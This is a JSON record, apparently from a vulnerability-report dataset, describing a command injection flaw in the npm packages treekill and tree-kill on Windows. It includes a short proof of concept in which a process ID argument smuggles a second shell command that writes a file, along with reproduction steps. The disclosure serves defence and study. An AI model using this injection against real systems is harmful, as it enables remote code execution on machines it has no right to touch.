{"description": "A Code Injection exists in treekill and tree-kill on Windows which allows a remote code execution when an attacker is able to control the input into the command.\n\n### Steps To Reproduce:\nCreate the following PoC file:\n\n```js\nvar kill = require('treekill');\nkill('3333332 & echo \"HACKED\" > HACKED.txt & ');\n```\n\nExecute the following commands in terminal:\n\n```shell\nnpm i treekill # Install affected module\ndir # Check *HACKED.txt* doesn't exist\nnode poc.js #  Run the PoC\ndir # Now *HACKED.txt* exists :)\n```\n\nThe HACKED.txt has been created", "methods": ["Used a Code Injection technique to execute arbitrary code on the system.", "Executed a command to create a file on the system.", "Used a Node.js module to execute a command on the system.", "Used a JavaScript file to execute a command on the system.", "Created a file on the system with arbitrary content."]}
